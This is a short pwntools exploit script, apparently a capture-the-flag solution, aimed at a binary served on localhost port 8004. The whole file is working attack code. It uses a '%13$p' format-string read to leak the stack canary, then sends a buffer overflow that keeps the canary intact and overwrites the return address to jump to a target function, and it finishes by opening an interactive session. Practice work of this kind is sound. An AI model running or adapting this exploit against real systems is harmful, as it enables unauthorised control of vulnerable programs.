from pwn import *

context.terminal = "kitty"

# io = process('./run')
# io = gdb.debug('./run', "break echo")
io = remote('localhost', 8004)

ret_addr = p64(0x000000000040101a)
func_addr = p64(0x4011d6)

io.recvline()
io.sendline(f'%13$p')
canary = int(io.recvline(), 16)
log.info(hex(canary))

io.sendline(b'a' * (8 * 5) + p64(canary) + p64(0) + ret_addr + func_addr)

io.interactive()
